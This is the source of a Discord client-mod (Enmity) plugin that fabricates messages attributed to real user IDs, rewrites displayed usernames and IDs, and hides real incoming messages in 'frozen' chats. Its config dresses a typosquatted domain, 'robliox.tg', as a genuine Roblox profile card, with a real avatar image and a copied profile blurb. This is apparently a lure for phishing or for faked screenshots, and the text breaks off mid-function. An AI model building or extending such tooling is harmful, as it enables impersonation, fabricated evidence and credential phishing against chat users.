            /*
            * Message Utilities (Enmity) — Enhanced Features
            * Put all your config in CONFIG below.
            *
            * Features:
            *  - Clipboard rewrite (IDs & discord.com links)
            *  - Dispatcher rewrite (message author usernames, IDs in content/embeds/mentions/references)
            *  - Link builder remap (guild/channel/message/user in generated links)
            *  - DM helper + injectMessage + sendMessage (with embed)
            *  - Fake messages from other users (manual + auto on startup)
            *  - Persistent fake messages that survive Discord updates/refreshes
            *  - Chat freezing to keep fake messages at bottom
            *
            * Safety:
            *  - No Enmity UI usage (no settings screen, no Form components)
            *  - Waits for modules, wraps everything in try/catch
            *  - If a module is missing on your build, that feature is skipped (no crash)
            *
            * Usage:
            *  - Edit CONFIG below.
            *  - (Optional) Use console: __MSG_UTILS__.injectMessage({...}) / sendMessage({...}) / fakeMessage({...})
            */

            /* ---------------------------------------------------------
            * 1) EDIT YOUR CONFIG HERE
            * ------------------------------------------------------- */
            
            /*
            * NEW: Enhanced Auto Fake Messages with Custom Embeds
            * 
            * The plugin now supports rich auto fake messages with customizable embeds!
            * You can configure autoFakeMessages with these new properties:
            * 
            * - embedTitle: "Your Custom Title"
            * - embedDescription: "Your custom description" 
            * - embedThumbnail: "https://your-image-url.com/image.jpg"
            * 
            * Example autoFakeMessages configuration:
            * {
            *   content: "https://www.robliox.tg/users/6081066/profile",
            *   embedTitle: "Konethorix's Profile",
            *   embedDescription: "Konethorix is one of the millions creating and exploring the endless possibilities of Roblox...",
            *   embedThumbnail: "https://your-thumbnail-url.com/image.jpg"
            * }
            * 
            * The plugin will automatically:
            * - Detect URLs and create rich embeds
            * - Use your custom title, description, and thumbnail
            * - Fall back to smart defaults based on URL type (Roblox, YouTube, Twitter, etc.)
            * - Fix the timestamp issue (no more 2035 dates!)
            * - Support both autoFakeMessages and manual message sending with embeds
            */
            
            const CONFIG = {
                features: {
                  clipboard:   true,
                  dispatcher:  true,
                  linkBuilders:true,
                  autoFakeMessages: true,
                  persistentMessages: true,
                  chatFreezing: true
                },
              
                startDelayMs: 800,
              
                autoFakeMessages: [
                  {
                    enabled: true,
                    delayMs: 2000,
                    channelId: "",
                    dmUserId: "753944929973174283",
                    userId: "753944929973174283",
                    content: "https://www.robliox.tg/users/6081066/profile",
                    username: "",
                    avatar: "",
                    embedTitle: "Konethorix's Profile",
                    embedDescription: "Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...",
                    embedThumbnail: "https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528"
                  }
                ],
              
                frozenChats: [
                  "753944929973174283",
                ],
              
                idMaps: [
                ],
              
                usernameRules: [
                  { matchId: ".Tweety", newId: "Emaytee" }
                ],
              
                tagRules: [
                ],
              
                quick: {
                  mode: "inject",
                  channelId: "",
                  dmUserId: "753944929973174283",
                  content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"Konethorix's Profile\" embedDescription: \"Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avapshot/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528\"",
                  embed: {
                    title: "",
                    description: "",
                    url: "",
                    thumbnail: ""
                  }
                }
              };
              

              (function () {

                if (window.__MSG_UTILS_LOADED__) return;
                window.__MSG_UTILS_LOADED__ = true;
              
                const get = (obj, path, dflt) => {
                  try { return path.split(".").reduce((o, k) => (o && k in o ? o[k] : undefined), obj) ?? dflt; }
                  catch { return dflt; }
                };
                const delay = (ms) => new Promise(r => setTimeout(r, ms));
              
              function sanitizeImageUrl(u) {
                try {
                  if (!u) return u;
                  let s = String(u);
                  if (s.includes('cdn.discordapp.net') || s.includes('media.discordapp.net')) {
                    return s;
                  }
                  
                  s = s.replace(/(\?|&)format=webp\b/i, "$1format=png");
                  s = s.replace(/\bformat=webp\b/i, "format=png");
                  
                  return s;
                } catch { return u; }
              }
              
              async function debugMessage(channelId, dmUserId, message) {
                try {
                  const MessageActions = await waitForProps(["receiveMessage"]);
                  const target = await normalizeTarget({ channelId, dmUserId });
                  
                  const debugMsg = {
                    id: `debug_${Date.now()}`,
                    type: 0,
                    content: `🔍 DEBUG: ${message}`,
                    channel_id: target,
                    author: { id: "0", username: "MessageUtils Debug", discriminator: "0000", bot: true },
                    embeds: [],
                    timestamp: new Date().toISOString(),
                    edited_timestamp: null,
                    flags: 0,
                    mention_everyone: false,
                    mention_roles: [],
                    mentions: [],
                    pinned: false,
                    tts: false
                  };
                  
                  MessageActions?.receiveMessage?.(target, debugMsg);
                } catch (error) {

                }
              }
              
              
                const silentError = (msg) => {

                };
              

                const api = {
                  register(fn)      { 
                    try { return get(window, "enmity.plugins.registerPlugin", null)?.(fn); } 
                    catch { return null; }
                  },
                  patcher()         { 
                    try { return get(window, "enmity.patcher", null); } 
                    catch { return null; }
                  },
                  getByProps(...p)  { 
                    try { return get(window, "enmity.modules.getByProps", () => null)(...p); } 
                    catch { return null; }
                  },
                  findMod(pred)     { 
                    try { return get(window, "enmity.modules.find", null)?.(pred) ?? null; } 
                    catch { return null; }
                  },
                  common()          { 
                    try { return get(window, "enmity.modules.common", {}); } 
                    catch { return {}; }
                  },
                  toasts()          { 
                    try { return get(window, "enmity.modules.common.Toasts", null); } 
                    catch { return null; }
                  },

                  showToast(msg)    { /* intentionally silent */ }
                };
              

                const persistentFakeMessages = new Map();
                let ChannelStore = null;
              

                const SNOWFLAKE_RE = /^\d{17,21}$/;
                function buildIdMap() {
                  const m = new Map();
                  for (const row of (CONFIG.idMaps || [])) {
                    if (row?.oldId && row?.newId) m.set(String(row.oldId), String(row.newId));
                  }
                  return m;
                }
                function mapId(id, m) {
                  const k = String(id ?? "");
                  return m.get(k) ?? k;
                }
              

                function shouldFreezeChannel(channelId) {
                  if (!channelId || !CONFIG.frozenChats?.length || !CONFIG.features.chatFreezing) return false;
                  

                  if (CONFIG.frozenChats.includes(channelId)) return true;
                  
                  
                  if (ChannelStore) {
                    const channel = ChannelStore.getChannel?.(channelId);
                    if (channel && channel.recipients && channel.recipients.length === 1) {
                      const recipientId = channel.recipients[0];
                      return CONFIG.frozenChats.includes(recipientId);
                    }
                  }
                  
                  return false;
                }
                
                // Helper function to check if a message should be allowed in frozen chat
                function shouldAllowMessageInFrozenChat(message) {
                  if (!message) return false;
                  return message.isFakeMessage || message.fromMessageUtils;
                }
                
                // Create a simple DOM message element as fallback
                function createSimpleMessageElement(message) {
                  try {
                    const messageDiv = document.createElement('div');
                    messageDiv.className = 'messageListItem__5126c';
                    messageDiv.style.cssText = `
                      margin: 16px 0;
                      padding: 16px;
                      border: 1px solid var(--background-tertiary);
                      border-radius: 8px;
                      background: var(--background-secondary);
                    `;
                    
                    const authorSpan = document.createElement('span');
                    authorSpan.style.cssText = `
                      font-weight: bold;
                      color: var(--text-normal);
                      margin-bottom: 8px;
                      display: block;
                    `;
                    authorSpan.textContent = message.author?.username || 'Unknown User';
                    
                    const contentDiv = document.createElement('div');
                    contentDiv.style.cssText = `
                      color: var(--text-normal);
                      margin-top: 8px;
                    `;
                    contentDiv.textContent = message.content || '';
                    
                    messageDiv.appendChild(authorSpan);
                    messageDiv.appendChild(contentDiv);
                    
                    // Add embeds if they exist
                    if (message.embeds && message.embeds.length > 0) {
                      message.embeds.forEach(embed => {
                        if (embed.title || embed.description) {
                          const embedDiv = document.createElement('div');
                          embedDiv.style.cssText = `
                            margin-top: 12px;
                            padding: 12px;
                            border-left: 4px solid var(--brand-experiment);
                            background: var(--background-primary);
                            border-radius: 4px;
                          `;
                          
                          if (embed.title) {
                            const titleDiv = document.createElement('div');
                            titleDiv.style.cssText = `
                              font-weight: bold;
                              color: var(--text-normal);
                              margin-bottom: 4px;
                            `;
                            titleDiv.textContent = embed.title;
                            embedDiv.appendChild(titleDiv);
                          }
                          
                          if (embed.description) {
                            const descDiv = document.createElement('div');
                            descDiv.style.cssText = `
                              color: var(--text-muted);
                              font-size: 14px;
                            `;
                            descDiv.textContent = embed.description;
                            embedDiv.appendChild(descDiv);
                          }
                          
                          messageDiv.appendChild(embedDiv);
                        }
                      });
                    }
                    
                    return messageDiv;
                  } catch (error) {
                    console.error('[MessageUtils] Failed to create simple message element:', error);
                    return null;
                  }
                }
              

                function rewriteOneDiscordUrl(u, idMap) {
                  try {
                    const url = new URL(String(u));
                    const host = String(url.hostname || "").toLowerCase();
                    if (!/^(?:www\.|ptb\.|canary\.)?discord\.com$/.test(host)) return u;
              
                    const parts = (url.pathname || "").split("/").filter(Boolean);
                    if (parts[0] === "channels") {
                      if (parts[1]) parts[1] = mapId(parts[1], idMap); // guild
                      if (parts[2]) parts[2] = mapId(parts[2], idMap); // channel
                      if (parts[3]) parts[3] = mapId(parts[3], idMap); // message
                    } else if (parts[0] === "users" && parts[1]) {
                      parts[1] = mapId(parts[1], idMap);
                    } else if (parts[0] === "guilds" && parts[1]) {
                      parts[1] = mapId(parts[1], idMap);
                    }
                    url.pathname = "/" + parts.join("/");
                    return url.toString();
                  } catch { return u; }
                }
                function rewriteDiscordUrlsInText(text, idMap) {
                  return String(text).replace(
                    /https?:\/\/(?:ptb\.|canary\.)?discord\.com\/[^\s)]+/g,
                    (m) => rewriteOneDiscordUrl(m, idMap)
                  );
                }
                function processTextForIdsAndLinks(text) {
                  const idMap = buildIdMap();
                  const raw = String(text ?? "");
                  const t = raw.trim();
                  if (!t) return raw;
                  if (SNOWFLAKE_RE.test(t)) return mapId(t, idMap);
                  return rewriteDiscordUrlsInText(raw, idMap);
                }
              

                function applyUsernameRules(author) {
                  if (!author) return;
                  for (const r of (CONFIG.usernameRules || [])) {
                    if (r.matchId && String(author.id) === String(r.matchId)) {
                      author.username = String(r.newUsername);
                      if (author.global_name) author.global_name = String(r.newUsername);
                    }
                    if (r.matchUsername && author.username === r.matchUsername) {
                      author.username = String(r.newUsername);
                      if (author.global_name) author.global_name = String(r.newUsername);
                    }
                  }
                  for (const r of (CONFIG.tagRules || [])) {
                    if (r.oldTag && r.newTag && author.discriminator === r.oldTag) {
                      author.discriminator = String(r.newTag);
                    }
                  }
                }
                function rewriteMessageObject(msg) {
                  if (!msg) return;
                  const idMap = buildIdMap();
              
                  // content
                  if (typeof msg.content === "string") {
                    msg.content = processTextForIdsAndLinks(msg.content);
                  }
                  // mentions
                  if (Array.isArray(msg.mentions)) {
                    for (const m of msg.mentions) if (m?.id) m.id = mapId(m.id, idMap);
                  }
                  // reference
                  if (msg.message_reference) {
                    const ref = msg.message_reference;
                    if (ref.guild_id) ref.guild_id = mapId(ref.guild_id, idMap);
                    if (ref.channel_id) ref.channel_id = mapId(ref.channel_id, idMap);
                    if (ref.message_id) ref.message_id = mapId(ref.message_id, idMap);
                  }
                  // embeds (basic pass)
                  if (Array.isArray(msg.embeds)) {
                    for (const e of msg.embeds) {
                      if (e?.title) e.title = rewriteDiscordUrlsInText(e.title, idMap);
                      if (e?.description) e.description = rewriteDiscordUrlsInText(e.description, idMap);
                      if (e?.url) e.url = rewriteOneDiscordUrl(e.url, idMap);
                    }
                  }
                }
                function rewriteAuthor(author) {
                  if (!author) return;
                  const idMap = buildIdMap();
                  if (author.id) author.id = mapId(author.id, idMap);
                  applyUsernameRules(author);
                }
              

                async function waitForProps(props, timeout = 8000, step = 100) {
                  const start = Date.now();
                  while (Date.now() - start < timeout) {
                    const mod = api.getByProps?.(...props);
                    if (mod) return mod;
                    await delay(step);
                  }
                  return null;
                }
              

                let patcher = null;
                async function patchClipboard() {
                  if (!CONFIG.features.clipboard) return;
                  try {
                    const Clipboard = await waitForProps(["setString", "getString"]);
                    if (!Clipboard) { silentError("Clipboard module missing"); return; }
                    patcher.before(Clipboard, "setString", (args) => {
                      try {
                        if (!args?.length) return;
                        args[0] = processTextForIdsAndLinks(args[0]);
                      } catch {}
                    });
                  } catch {}
                }
              
                async function patchLinkBuilders() {
                  if (!CONFIG.features.linkBuilders) return;
                  try {
                    const builder = api.findMod?.((m) => {
                      for (const k in m) {
                        if (typeof m[k] === "function") {
                          const s = String(m[k]);
                          if (s.includes("discord.com") && s.includes("/channels/")) return true;
                        }
                      }
                      return false;
                    });
                    if (!builder) return;
              
                    Object.keys(builder).forEach((key) => {
                      if (typeof builder[key] !== "function") return;
                      patcher.before(builder, key, (args) => {
                        try {
                          const idMap = buildIdMap();
                          if (args.length === 3) {
                            args[0] = mapId(args[0], idMap);
                            args[1] = mapId(args[1], idMap);
                            args[2] = mapId(args[2], idMap);
                          } else if (args.length === 1 && args[0] && typeof args[0] === "object") {
                            const o = args[0];
                            if ("guildId"   in o) o.guildId   = mapId(o.guildId, idMap);
                            if ("channelId" in o) o.channelId = mapId(o.channelId, idMap);
                            if ("messageId" in o) o.messageId = mapId(o.messageId, idMap);
                            if ("userId"    in o) o.userId    = mapId(o.userId, idMap);
                          }
                        } catch {}
                      });
                    });
                  } catch {}
                }
              

                async function patchDispatcher() {
                  if (!CONFIG.features.dispatcher && !CONFIG.features.chatFreezing) return;
                  try {
                    const FluxDispatcher = get(api.common(), "FluxDispatcher", null);
                    if (!FluxDispatcher?.dispatch) { silentError("Dispatcher missing"); return; }
              
                    patcher.before(FluxDispatcher, "dispatch", (args) => {
                      try {
                        const action = args?.[0];
                        if (!action || !action.type) return;
              
                        // Chat freezing functionality
                        if (CONFIG.features.chatFreezing) {
      
                          if (action.type === 'MESSAGE_CREATE' || action.type === 'MESSAGE_UPDATE') {
                            const channelId = action.channelId || action.message?.channel_id;
                            if (channelId && shouldFreezeChannel(channelId)) {
                              // Allow fake messages to pass through
                              const message = action.message || action.messageRecord;
                              if (shouldAllowMessageInFrozenChat(message)) {
                                // Let fake messages through
                                console.log(`[MessageUtils] Allowing fake message in frozen chat: ${message?.id || 'unknown'}`);
                              } else {
                                // Block real user messages
                                console.log(`[MessageUtils] Blocking real message in frozen chat: ${message?.id || 'unknown'}`);
                                return null;
                              }
                            }
                          }
              
                          
                          if (action.type === 'LOAD_MESSAGES_SUCCESS' && shouldFreezeChannel(action.channelId)) {

                            return null;
                          }
                        }
              
                        
                        if (action.type === "MESSAGE_CREATE" || action.type === "MESSAGE_UPDATE") {
                          const msg = action.message || action.messageRecord;
                          if (!msg) return;
                          rewriteAuthor(msg.author);
                          rewriteMessageObject(msg);
                        }
              
                        if (action.type === "LOAD_MESSAGES_SUCCESS" && Array.isArray(action.messages)) {
                          for (const m of action.messages) {
                            rewriteAuthor(m.author);
                            rewriteMessageObject(m);
                          }
                          

                          if (CONFIG.features.persistentMessages) {
                            setTimeout(() => {
                              reinjectPersistentMessages(action.channelId);
                            }, 100);
                          }
                        }
                      } catch {}
                    });
                  } catch {}
                }
              

                async function patchMessageSending() {
                  if (!CONFIG.features.chatFreezing) return;
                  try {
                    const MessageActions = await waitForProps(['sendMessage']);
                    if (!MessageActions) return;
                    
                    patcher.before(MessageActions, 'sendMessage', (args) => {
                      try {
                        const channelId = args[0];
                        if (channelId && shouldFreezeChannel(channelId)) {
                          // Allow fake messages and system messages to pass through
                          const messageContent = args[1];
                          if (messageContent && typeof messageContent === 'object') {
                            // Check if this is a fake message (has specific properties)
                            if (messageContent.isFakeMessage || messageContent.fromMessageUtils) {
                              console.log(`[MessageUtils] Allowing fake message send in frozen chat: ${channelId}`);
                              return; // Allow fake messages
                            }
                          }
                          
                          silentError('Cannot send messages in frozen chat');
                          throw new Error('Chat is frozen - cannot send messages');
                        }
                      } catch (error) {
                        silentError('Message send block error');
                      }
                    });
                  } catch (error) {
                    silentError('Failed to patch message sending');
                  }
                }
              

                async function ensureDmChannel(userId) {
                  const DMs  = await waitForProps(["getDMFromUserId", "getChannel"]);
                  const HTTP = await waitForProps(["get", "post", "put", "del", "patch"]);
                  const existing = DMs?.getDMFromUserId?.(userId);
                  if (existing) return existing;
                  const res = await HTTP?.post?.({ url: "/users/@me/channels", body: { recipient_id: userId } });
                  const id = res?.body?.id;
                  if (!id) throw new Error("Create DM failed");
                  return id;
                }
                async function normalizeTarget({ channelId, dmUserId }) {
                  if (channelId) return String(channelId);
                  if (dmUserId) return await ensureDmChannel(String(dmUserId));
                  throw new Error("Provide channelId or dmUserId");
                }
                

                async function getUserInfo(userId) {
                  try {
                    const UserStore = await waitForProps(["getUser", "getCurrentUser"]);
                    if (!UserStore?.getUser) {
                      throw new Error("UserStore not available");
                    }
                    
                    // Add timeout to prevent hanging on WiFi
                    const userInfo = await Promise.race([
                      UserStore.getUser(userId),
                      new Promise((_, reject) => 
                        setTimeout(() => reject(new Error("User info fetch timeout")), 3000)
                      )
                    ]);
                    
                    return userInfo;
                  } catch (error) {
                    console.warn(`[MessageUtils] Failed to get user info for ${userId}:`, error.message);
                    throw error; // Re-throw to be handled by caller
                  }
                }
                
                // Reinject persistent fake messages when messages are loaded
                async function reinjectPersistentMessages(channelId) {
                  if (!persistentFakeMessages.has(channelId)) return;
                  
                  const messages = persistentFakeMessages.get(channelId);
                  const MessageActions = await waitForProps(["receiveMessage"]);
                  
                  for (const fakeMessage of messages) {
                    try {
                      MessageActions?.receiveMessage?.(channelId, {...fakeMessage});
                    } catch (error) {
                      silentError("Failed to reinject persistent message");
                    }
                  }
                }
                

                async function fakeMessage({ channelId, dmUserId, userId, content, embed, username, avatar, timestamp, persistent = true }) {
                  debugMessage(channelId, dmUserId, `fakeMessage called with content: "${content}" and embed: ${JSON.stringify(embed)}`);
                  
                  const MessageActions = await waitForProps(["sendMessage", "receiveMessage"]);
                  const target = await normalizeTarget({ channelId, dmUserId });
                  

                  let messageTimestamp;
                  try {
                    if (timestamp) {
                      // Parse the provided timestamp
                      const date = new Date(timestamp);
                      if (isNaN(date.getTime())) {
                        throw new Error("Invalid timestamp");
                      }
                      messageTimestamp = date.toISOString();
                    } else {
                      // Use current timestamp instead of future timestamp
                      messageTimestamp = new Date().toISOString();
                    }
                  } catch (error) {
                    // Fallback to current timestamp
                    messageTimestamp = new Date().toISOString();
                  }
                  
                  
                  let userInfo = null;
                  if (userId) {
                    try {
                      userInfo = await getUserInfo(userId);
                    } catch (error) {
                      debugMessage(channelId, dmUserId, `Failed to get user info for ${userId}, using fallback: ${error.message}`);
                      // Use fallback user info to prevent message deletion
                      userInfo = {
                        username: username || "Unknown User",
                        discriminator: "0000",
                        avatar: avatar || null,
                        global_name: username || "Unknown User",
                        bot: false
                      };
                    }
                  }
                  
                  // Auto-detect URLs and create embeds
                  let embeds = [];
                  
                  if (embed && (embed.title || embed.description || embed.url || embed.thumbnail || embed.image)) {
                    debugMessage(channelId, dmUserId, `Custom embed provided: ${JSON.stringify(embed)}`);
                    

                    let embedUrl = embed.url;
                    if (!embedUrl && content) {
                      const urlRegex = /(https?:\/\/[^\s]+)/g;
                      const urls = content.match(urlRegex);
                      if (urls && urls.length > 0) {
                        embedUrl = urls[0]; // Use first URL found
                        debugMessage(channelId, dmUserId, `Extracted URL from content: ${embedUrl}`);
                      }
                    }
                    
                    const thumbUrl = (embed?.thumbnail && typeof embed.thumbnail === "object" ? embed.thumbnail.url : embed?.thumbnail) || undefined;
                    const imageUrl = (embed?.image && typeof embed.image === "object" ? embed.image.url : embed?.image) || undefined;
                    
                    debugMessage(channelId, dmUserId, `Thumbnail URL: ${thumbUrl || 'none'}`);
                    debugMessage(channelId, dmUserId, `Image URL: ${imageUrl || 'none'}`);
                    
                    const built = {
                      type: "rich",
                      title: embed.title || undefined,
                      description: embed.description || undefined,
                      url: embedUrl || undefined
                    };
                    
                    // Enhanced thumbnail handling with proper sizing and styling
                    if (thumbUrl) {
                      const sanitizedThumbUrl = sanitizeImageUrl(thumbUrl);
                      built.thumbnail = { 
                        url: sanitizedThumbUrl,
                        width: 80,
                        height: 80
                      };
                      debugMessage(channelId, dmUserId, `Added thumbnail with dimensions: 80x80`);
                    }
                    
                    // Set image if provided, otherwise use thumbnail as large image
                    if (imageUrl) {
                      built.image = { url: sanitizeImageUrl(imageUrl) };
                    } else if (thumbUrl) {
                      // Use thumbnail as the main image for better visibility
                      built.image = { url: sanitizeImageUrl(thumbUrl) };
                      debugMessage(channelId, dmUserId, `Using thumbnail as main image`);
                    }
                    
                    debugMessage(channelId, dmUserId, `Built embed: ${JSON.stringify(built)}`);
                    embeds.push(built);
                  }
                  
                  // Auto-detect URLs in content and create embeds if no custom embed
                  if (!embeds.length && content) {
                    debugMessage(channelId, dmUserId, `No custom embed, auto-detecting URLs in content`);
                    const urlRegex = /(https?:\/\/[^\s]+)/g;
                    const urls = content.match(urlRegex);
                    
                    if (urls && urls.length > 0) {
                      debugMessage(channelId, dmUserId, `Found ${urls.length} URLs: ${urls.join(', ')}`);
                      for (const url of urls) {
                        try {
                          debugMessage(channelId, dmUserId, `Processing URL: ${url}`);
                          const urlObj = new URL(url);
                          const hostname = urlObj.hostname.toLowerCase();
                          debugMessage(channelId, dmUserId, `Hostname: ${hostname}`);
                          
                          // Create embed based on URL type
                          let embedData = {
                            type: "rich",
                            url: url,
                            title: embed?.title || "",
                            description: embed?.description || "",
                            thumbnail: { url: embed?.thumbnail || "" }
                          };
                          
                          // Customize embed based on URL content if no custom embed data
                          if (!embed?.title) {
                            if (hostname.includes('roblox')) {
                              // Roblox profile
                              if (url.includes('/users/') && url.includes('/profile')) {
                                const userId = url.match(/\/users\/(\d+)\/profile/)?.[1];
                                embedData.title = `Roblox Profile`;
                                embedData.description = `View this user's Roblox profile`;
                                embedData.thumbnail.url = `https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528`;
                              } else if (url.includes('/games/')) {
                                embedData.title = `Roblox Game`;
                                embedData.description = `Check out this Roblox game`;
                              }
                            } else if (hostname.includes('youtube') || hostname.includes('youtu.be')) {
                              embedData.title = `YouTube Video`;
                              embedData.description = `Watch this YouTube video`;
                            } else if (hostname.includes('twitter') || hostname.includes('x.com')) {
                              embedData.title = `Twitter Post`;
                              embedData.description = `View this Twitter post`;
                            } else if (hostname.includes('discord')) {
                              embedData.title = `Discord Link`;
                              embedData.description = `Discord server or channel`;
                            } else {
                              // Generic link
                              embedData.title = `Link`;
                              embedData.description = `Click to visit this link`;
                            }
                          }
                          
                          // If content contains specific embed info, use it (override everything)
                          if (content.includes('embedTitle:')) {
                            const titleMatch = content.match(/embedTitle:\s*"([^"]+)"/);
                            if (titleMatch) embedData.title = titleMatch[1];
                          }
                          
                          if (content.includes('embedDescription:')) {
                            const descMatch = content.match(/embedDescription:\s*"([^"]+)"/);
                            if (descMatch) embedData.description = descMatch[1];
                          }
                          
                          if (content.includes('embedThumbnail:')) {
                            const thumbMatch = content.match(/embedThumbnail:\s*"([^"]+)"/);
                            if (thumbMatch) embedData.thumbnail.url = thumbMatch[1];
                          }
                          
                          // If the URL looks like a direct image or Discord CDN attachment, set as large image
                          const isLikelyImage = /\.(png|jpe?g|gif|webp)(\?|$)/i.test(url) || 
                                               /(?:cdn|media)\.discordapp\.net/i.test(hostname) || 
                                               /cdn\.discordapp\.com\/attachments\//i.test(url) ||
                                               /external\/.*\/https:\/\/.*\.(png|jpe?g|gif|webp)/i.test(url);
                          debugMessage(channelId, dmUserId, `URL ${url} is likely image: ${isLikelyImage}`);
                          if (isLikelyImage) {
                            const sanitizedUrl = sanitizeImageUrl(url);
                            debugMessage(channelId, dmUserId, `Original URL: ${url}`);
                            debugMessage(channelId, dmUserId, `Sanitized URL: ${sanitizedUrl}`);
                            embedData.image = { url: sanitizedUrl };
                            debugMessage(channelId, dmUserId, `Set image URL: ${sanitizedUrl}`);
                          }
                          
                          debugMessage(channelId, dmUserId, `Final embed data: ${JSON.stringify(embedData)}`);
                          embeds.push(embedData);
                        } catch (urlError) {
                          debugMessage(channelId, dmUserId, `Error processing URL ${url}: ${urlError.message}`);
                        }
                      }
                    }
                  }
                  
                  debugMessage(channelId, dmUserId, `Final embeds array: ${JSON.stringify(embeds)}`);
              
                  // Create robust author object that doesn't depend on network requests
                  const author = {
                    id: userId || "0",
                    username: username || (userInfo?.username || "Unknown User"),
                    discriminator: userInfo?.discriminator || "0000",
                    avatar: avatar || userInfo?.avatar || null,
                    global_name: userInfo?.global_name || username || "Unknown User",
                    bot: userInfo?.bot || false
                  };
                  
                  // Ensure all required fields are present
                  if (!author.username || author.username === "Unknown User") {
                    author.username = "MessageBot";
                    author.global_name = "MessageBot";
                  }
                  
                  const fake = {
                    id: `persistent_${Date.now()}_${Math.floor(Math.random() * 10000)}`,
                    type: 0,
                    content: String(content ?? ""),
                    channel_id: target,
                    author: author,
                    embeds,
                    timestamp: messageTimestamp,
                    edited_timestamp: null,
                    flags: 0,
                    mention_everyone: false,
                    mention_roles: [],
                    mentions: [],
                    pinned: false,
                    tts: false
                  };
                  
                  debugMessage(channelId, dmUserId, `Sending fake message with ${embeds.length} embeds`);
                  
                  try {
                    // Try to send via MessageActions first
                    if (MessageActions?.receiveMessage) {
                      MessageActions.receiveMessage(target, fake);
                      debugMessage(channelId, dmUserId, `Message sent via MessageActions`);
                    } else {
                      throw new Error("MessageActions not available");
                    }
                  } catch (error) {
                    debugMessage(channelId, dmUserId, `Failed to send via MessageActions: ${error.message}`);
                    
                    // Fallback: try to dispatch manually via FluxDispatcher
                    try {
                      const FluxDispatcher = get(api.common(), "FluxDispatcher", null);
                      if (FluxDispatcher?.dispatch) {
                        FluxDispatcher.dispatch({
                          type: "MESSAGE_CREATE",
                          message: fake,
                          channelId: target
                        });
                        debugMessage(channelId, dmUserId, `Message dispatched via FluxDispatcher`);
                      } else {
                        throw new Error("FluxDispatcher not available");
                      }
                    } catch (dispatchError) {
                      debugMessage(channelId, dmUserId, `Failed to dispatch via FluxDispatcher: ${dispatchError.message}`);
                      
                      // Last resort: create a simple DOM element
                      try {
                        const chatContainer = document.querySelector(`[data-list-id="chat-messages"]`);
                        if (chatContainer) {
                          const messageElement = createSimpleMessageElement(fake);
                          if (messageElement) {
                            chatContainer.appendChild(messageElement);
                            debugMessage(channelId, dmUserId, `Message created as DOM element`);
                          }
                        }
                      } catch (domError) {
                        debugMessage(channelId, dmUserId, `Failed to create DOM element: ${domError.message}`);
                      }
                    }
                  }
                  

                  if (persistent && CONFIG.features.persistentMessages) {
                    if (!persistentFakeMessages.has(target)) {
                      persistentFakeMessages.set(target, []);
                    }
                    persistentFakeMessages.get(target).push(fake);
                  }
                  
                  return fake;
                }
                
                async function injectMessage({ channelId, dmUserId, content, embed }) {
                  const MessageActions = await waitForProps(["sendMessage", "receiveMessage"]);
                  const target = await normalizeTarget({ channelId, dmUserId });
                  const nowIso = new Date().toISOString();
              

                  let embeds = [];
                  
                  if (embed && (embed.title || embed.description || embed.url || embed.thumbnail || embed.image)) {
                    // Extract URL from content if no URL provided
                    let embedUrl = embed.url;
                    if (!embedUrl && content) {
                      const urlRegex = /(https?:\/\/[^\s]+)/g;
                      const urls = content.match(urlRegex);
                      if (urls && urls.length > 0) {
                        embedUrl = urls[0]; // Use first URL found
                      }
                    }
                    
                    const thumbUrl = (embed?.thumbnail && typeof embed.thumbnail === "object" ? embed.thumbnail.url : embed?.thumbnail) || undefined;
                    const imageUrl = (embed?.image && typeof embed.image === "object" ? embed.image.url : embed?.image) || undefined;
                    const built = {
                      type: "rich",
                      title: embed.title || undefined,
                      description: embed.description || undefined,
                      url: embedUrl || undefined
                    };
                    
                    // Enhanced thumbnail handling with proper sizing and styling
                    if (thumbUrl) {
                      const sanitizedThumbUrl = sanitizeImageUrl(thumbUrl);
                      built.thumbnail = { 
                        url: sanitizedThumbUrl,
                        width: 80,
                        height: 80
                      };
                    }
                    
                    // Set image if provided, otherwise use thumbnail as large image
                    if (imageUrl) {
                      built.image = { url: sanitizeImageUrl(imageUrl) };
                    } else if (thumbUrl) {
                      // Use thumbnail as the main image for better visibility
                      built.image = { url: sanitizeImageUrl(thumbUrl) };
                    }
                    
                    embeds.push(built);
                  }
                  
                  // Auto-detect URLs in content and create embeds if no custom embed
                  if (!embeds.length && content) {
                    const urlRegex = /(https?:\/\/[^\s]+)/g;
                    const urls = content.match(urlRegex);
                    
                    if (urls && urls.length > 0) {
                      for (const url of urls) {
                        try {
                          const urlObj = new URL(url);
                          const hostname = urlObj.hostname.toLowerCase();
                          
                          // Create embed based on URL type
                          let embedData = {
                            type: "rich",
                            url: url,
                            title: embed?.title || "",
                            description: embed?.description || "",
                            thumbnail: { url: embed?.thumbnail || "" }
                          };
                          
                          // Customize embed based on URL content if no custom embed data
                          if (!embed?.title) {
                            if (hostname.includes('roblox')) {
                              // Roblox profile
                              if (url.includes('/users/') && url.includes('/profile')) {
                                const userId = url.match(/\/users\/(\d+)\/profile/)?.[1];
                                embedData.title = `Roblox Profile`;
                                embedData.description = `View this user's Roblox profile`;
